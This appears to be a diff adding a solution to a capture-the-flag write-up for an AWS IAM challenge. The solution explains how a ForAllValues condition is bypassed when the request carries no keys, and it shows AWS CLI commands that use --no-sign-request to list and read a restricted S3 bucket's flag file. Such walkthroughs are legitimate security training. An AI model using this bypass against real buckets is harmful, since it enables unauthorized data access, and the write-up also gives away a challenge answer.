@@ -32,3 +32,25 @@
 ```
 
 ## Solution
+
+- https://awstip.com/creating-unintentional-ways-to-bypass-aws-iam-policies-when-using-the-forallvalues-operator-3516a7f17ed0
+- ForAllValues:StringLike - It also returns true if there are no keys in the request, or if the key values resolve to a null data set, such as an empty string.
+- Hence the condition is bypassed.
+
+
+### Method1
+
+1. The GetObject has an open access, howerver the ListBucket is conditional based on ARN.
+2. So using --no-sign-request we send an request without an ARN of the current user ( my assunption )
+``` bash
+
+> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ 
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+> aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
+2023-06-07 19:15:43         42 flag-as-admin.txt
+2023-06-08 19:20:01      81889 logo-admin.png
+```
+```bash
+> aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - 
+{wiz:principal-arn-is-not-xxxxxxxxxxxx}
+```
